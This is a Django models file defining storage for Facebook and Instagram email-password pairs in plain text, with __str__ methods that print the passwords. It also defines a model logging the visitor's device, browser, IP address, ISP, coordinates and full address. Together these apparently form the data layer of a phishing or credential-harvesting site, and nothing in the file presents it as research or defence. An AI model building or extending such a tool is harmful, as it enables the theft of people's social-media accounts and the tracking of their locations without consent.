from django.db import models

# Create your models here.

class FacebookAccount(models.Model):
    email = models.CharField(blank=1, null=1, max_length=100)
    password = models.CharField(blank=1, null=1, max_length=100)
    created = models.DateTimeField(auto_now_add=True, null=1, blank=1)
    def __str__(self):
        return self.email + " || " + self.password + " || " + str(self.created)


class InstagramAccount(models.Model):
    email = models.CharField(blank=1, null=1, max_length=100)
    password = models.CharField(blank=1, null=1, max_length=100)
    created = models.DateTimeField(auto_now_add=True, null=1, blank=1)
    def __str__(self):
        return self.email + " || " + self.password + " || " + str(self.created)
    

class AccountInfo(models.Model):
    is_mobile = models.CharField(blank=1, null=1, max_length=100)
    is_tablet = models.CharField(blank=1, null=1, max_length=100)
    is_touch_capable = models.CharField(blank=1, null=1, max_length=100)
    is_pc = models.CharField(blank=1, null=1, max_length=100)
    is_bot = models.CharField(blank=1, null=1, max_length=100)
    browser = models.CharField(blank=1, null=1, max_length=5000)
    browser_family = models.CharField(blank=1, null=1, max_length=100)
    browser_version = models.CharField(blank=1, null=1, max_length=100)
    os = models.CharField(blank=1, null=1, max_length=100)
    os_family = models.CharField(blank=1, null=1, max_length=100)
    os_version = models.CharField(blank=1, null=1, max_length=100)
    device = models.CharField(blank=1, null=1, max_length=100)
    device_family = models.CharField(blank=1, null=1, max_length=100)

    ipAddress = models.CharField(blank=1, null=1, max_length=100)
    location = models.CharField(blank=1, null=1, max_length=100)
    region = models.CharField(blank=1, null=1, max_length=100)
    city = models.CharField(blank=1, null=1, max_length=100)
    latitude = models.CharField(blank=1, null=1, max_length=100)
    longitude = models.CharField(blank=1, null=1, max_length=100)
    timezone = models.CharField(blank=1, null=1, max_length=100)
    isp = models.CharField(blank=1, null=1, max_length=100)
    fullAddress = models.CharField(blank=1, null=1, max_length=1000)
    created = models.DateTimeField(auto_now_add=True, null=1, blank=1)
    
    def __str__(self) -> str:
        return self.ipAddress + " || " + self.location + " || " + self.region + " || " + self.city